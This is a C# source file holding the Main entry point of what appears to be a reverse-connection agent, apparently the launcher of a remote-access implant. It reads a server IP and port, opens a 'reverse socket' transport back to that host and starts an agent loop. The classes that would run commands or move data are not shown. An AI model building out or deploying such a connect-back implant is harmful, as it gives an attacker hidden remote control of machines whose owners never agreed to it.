using System;
using System.Text;
using System.Net;

namespace pypyagent
{

    class Program
    {
        static void Main(string[] args)
        {
            bool useConsole = true;
            if (args.Length < 2){
                Console.WriteLine("Usage: agent.exe <server_ip> <server_port>");
                System.Environment.Exit(1);
            }
            string server_ip = args[0];
            int port = Int32.Parse(args[1]);

            if(args.Length >= 3)
            {
                useConsole = bool.Parse(args[2]);
            }

            PYPYreader reader = new PYPYreader();
            PYPYReverseSocketTransport transport = new PYPYReverseSocketTransport(server_ip, port);

            PYPYagent agent = new PYPYagent(reader, transport, useConsole);
            agent.run();
        }
    }
}
